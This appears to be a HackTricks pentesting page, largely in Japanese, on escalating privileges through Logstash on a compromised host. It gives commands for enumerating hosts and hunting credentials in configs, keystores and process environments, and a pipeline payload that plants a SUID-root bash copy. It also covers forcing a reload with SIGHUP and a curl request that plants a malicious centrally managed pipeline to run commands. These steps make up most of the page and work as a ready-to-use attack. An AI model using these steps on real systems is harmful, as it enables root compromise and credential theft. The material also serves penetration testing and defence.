# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash は **ログを収集、変換、転送** するために、**pipelines** として知られるシステムを通じて機能します。これらのパイプラインは **input**, **filter**, **output** の各ステージで構成されています。Logstash が compromised machine 上で動作する場合、興味深い側面が生じます。

### パイプラインの設定

パイプラインはファイル **/etc/logstash/pipelines.yml** で設定されており、ここにはパイプライン設定の場所が一覧化されています：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
このファイルは、パイプライン構成を含む **.conf** ファイルがどこに配置されているかを示します。**Elasticsearch output module** を使用する場合、**pipelines** に **Elasticsearch credentials** が含まれていることが多く、Logstash が Elasticsearch にデータを書き込む必要があるため、それらはしばしば広範な権限を持ちます。設定パスのワイルドカードにより、Logstash は指定されたディレクトリ内の一致するすべてのパイプラインを実行できます。

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. This creates 2 offensive implications:

- A dropped file like `000-input.conf` or `zzz-output.conf` can change how the final pipeline is assembled
- A malformed file can prevent the whole pipeline from loading, so validate payloads carefully before relying on auto-reload

### 侵害されたホストでの高速列挙

Logstash がインストールされているホストでは、次を素早く確認する：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
また、ローカルの監視 API に到達可能か確認してください。デフォルトでは **127.0.0.1:9600** にバインドされており、ホストに到達した後は通常これで十分です:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
通常、これによりパイプラインID、ランタイムの詳細、および変更したパイプラインが読み込まれたことの確認が得られます。

Logstashから回収した資格情報は通常**Elasticsearch**のアクセスを解除するので、[this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md)を確認してください。

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is running, typically the **logstash** user. Ensure you meet **one** of these criteria:

- パイプラインの **.conf** ファイルに対する **write access** を持っている **or**
- **/etc/logstash/pipelines.yml** がワイルドカードを使用しており、ターゲットフォルダに書き込みできる

さらに、次の条件のうち**いずれか1つ**を満たす必要があります:

- Logstashサービスを再起動する権限がある **or**
- **/etc/logstash/logstash.yml** に **config.reload.automatic: true** が設定されている

設定にワイルドカードが含まれている場合、そのワイルドカードに一致するファイルを作成することでコマンド実行が可能になります。例えば:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
ここで、**interval** は実行頻度（秒単位）を決定します。例では、**whoami** コマンドが 120 秒ごとに実行され、その出力は **/tmp/output.log** に送られます。

**/etc/logstash/logstash.yml** に **config.reload.automatic: true** が設定されていると、Logstash は再起動なしで新規または変更されたパイプライン構成を自動的に検出して適用します。ワイルドカードがない場合でも既存の構成の変更は可能ですが、障害を避けるため注意が必要です。

### より信頼性の高いパイプラインペイロード

`exec` input plugin は現在のリリースでも動作し、`interval` または `schedule` のいずれかを必要とします。これは Logstash JVM を **forking** して実行されるため、メモリが不足していると、何も出ずに動作する代わりに `ENOMEM` でペイロードが失敗する可能性があります。

より実用的な権限昇格ペイロードは、通常、永続的なアーティファクトを残すものです：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
再起動権限がなくてもプロセスにシグナルを送信できる場合、LogstashはUnix系システムで**SIGHUP**によるリロードをサポートします:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
すべてのプラグインが再読み込みに対応しているわけではないことに注意してください。例えば、**stdin** input は自動リロードを妨げるため、`config.reload.automatic` が常に変更を反映するとは限りません。

### Logstash からシークレットを盗む

コード実行だけに注力する前に、Logstash が既にアクセスできるデータを収集してください:

- 平文の認証情報は `elasticsearch {}` 出力、`http_poller`、JDBC inputs、またはクラウド関連の設定内にハードコードされていることが多い
- セキュア設定は **`/etc/logstash/logstash.keystore`** や別の `path.settings` ディレクトリに存在する場合がある
- keystore のパスワードはしばしば **`LOGSTASH_KEYSTORE_PASS`** を通じて渡され、パッケージベースのインストールでは一般的に **`/etc/sysconfig/logstash`** から取得される
- `${VAR}` による環境変数の展開は Logstash 起動時に解決されるため、サービスの環境変数は確認する価値がある

有用な確認項目:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
これは確認する価値があります。**CVE-2023-46672** により、特定の状況下で Logstash が機密情報をログに記録する可能性があることが示されました。ポストエクスプロイテーションのホストでは、現在の設定がシークレットをインラインで保持する代わりに keystore を参照していても、古い Logstash ログや `journald` エントリが認証情報を露呈する可能性があります。

### Centralized Pipeline Management Abuse

一部の環境では、ホストはローカルの `.conf` ファイルをまったく使用しません。**`xpack.management.enabled: true`** が設定されていると、Logstash は Elasticsearch/Kibana から中央管理されたパイプラインを取得でき、このモードを有効にするとローカルのパイプライン設定はもはや真の情報源ではなくなります。

つまり、別の攻撃経路が発生します:

1. ローカルの Logstash 設定、keystore、またはログから Elastic の認証情報を回収する
2. 対象アカウントが **`manage_logstash_pipelines`** クラスター権限を持っているか確認する
3. 中央管理されたパイプラインを作成または置換して、Logstash ホストが次のポーリング間隔であなたのペイロードを実行するようにする

この機能で使用される Elasticsearch API は次のとおりです:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
これは、ローカルファイルが読み取り専用であっても、Logstashが既にリモートからパイプラインを取得するよう登録されている場合に特に有用です。

## 参考資料

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
